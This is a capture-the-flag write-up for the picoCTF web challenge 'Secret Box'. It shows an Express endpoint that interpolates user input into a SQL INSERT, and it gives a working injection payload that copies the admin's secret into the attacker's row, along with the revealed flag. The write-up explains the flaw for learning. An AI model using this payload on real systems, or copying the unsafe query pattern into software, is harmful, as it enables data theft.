# Secret Box

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{sq1_1nject10n_a8db399d}`

## Summary

A Node.js/Express/PostgreSQL "secrets vault" app parameterizes every SQL query with knex's `?`
placeholders except one: the secret-creation endpoint builds its `INSERT` via raw template
string interpolation of user-supplied content. That one unsafe query is enough for a classic
UNION-free SQL injection to smuggle another user's (the admin's) secret content into a secret
owned by the attacker's own account.

## Discovery

The challenge provides full source. Every other query in `server.js` and `handler.js` uses
knex's parameter binding correctly, e.g.:

```javascript
const userResult = await db.raw(
    `SELECT * FROM users WHERE username = ? AND password = ? LIMIT 1`,
    [username, password]
);
```

`POST /secrets/create` is the one exception:

```javascript
app.post('/secrets/create', authMiddleware, async (req, res) => {
    const userId = req.userId;
    const content = req.body.content;
    const query = await db.raw(
        `INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`
    );
    return res.redirect('/');
});
```

`content` comes straight from the request body with zero sanitization or escaping, and is
concatenated directly into the SQL text. `db.js` also reveals the exact detail needed to target
the right row: a fixed user ID (`e2a66f7d-2ce6-4861-b4aa-be8e069601cb`) is the one whose
`secrets.content` gets overwritten with the real flag on startup.

## Proof of Concept

Sign up and log in normally to get a valid `auth_token` session cookie, then submit a crafted
`content` value on the secret creation form. The key constraint is that the injected payload
must resolve to exactly one value in the `VALUES(...)` tuple (two columns, two values) rather
than adding an extra comma-separated element, which would break the column count. String
concatenation (`||`) keeps it inside a single value slot:

```
content = ' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || '
```

Substituted into the template, the executed query becomes:

```sql
INSERT INTO secrets(owner_id, content)
VALUES ('<attacker_user_id>', '' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || '')
```

which is valid SQL: an empty string concatenated with the subquery's result concatenated with
another empty string, i.e. just the subquery's result, inserted as a brand new secret owned by
the attacker. Loading `/` (My Secrets) afterward shows the new row with the admin's flag as its
content:

```
picoCTF{sq1_1nject10n_a8db399d}
```

## Root Cause

Inconsistent query construction within the same codebase: every other database call correctly
uses parameterized queries, but this one endpoint reverts to raw string interpolation for
user-controlled input, reopening classic SQL injection despite the rest of the app doing the
right thing.

## CWE / OWASP

- **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
- **OWASP A03:2021**: Injection
